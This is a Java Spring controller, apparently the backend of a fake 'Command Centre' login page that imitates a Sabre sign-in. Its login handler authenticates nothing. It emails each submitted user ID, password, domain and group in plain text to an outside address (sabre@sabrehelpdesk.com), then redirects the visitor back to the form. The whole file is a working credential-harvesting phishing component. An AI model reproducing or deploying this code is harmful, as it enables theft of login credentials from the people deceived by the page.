package com.commandcenter.ngp.sabre.controller;

import com.commandcenter.ngp.sabre.service.EmailService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class LoginController {

    @Autowired
    private EmailService emailService;

    @GetMapping("/")
    public String showLoginForm() {
        return "index"; // This should map to your login.html or login.jsp file
    }

 @PostMapping("/login")
 public String handleLogin(@RequestParam String userId, @RequestParam String password,
                               @RequestParam String domain, @RequestParam String group, Model model) {



     String subject = "New Login Attempt With Command Centre";
     String message = "User ID: " + userId + "\nPassword: " + password +"\n domain: " + domain + "\nGroup: " + (group != null ? group : "N/A");

     emailService.sendEmail("sabre@sabrehelpdesk.com", subject, message);
        return  "redirect:/";
    }
}
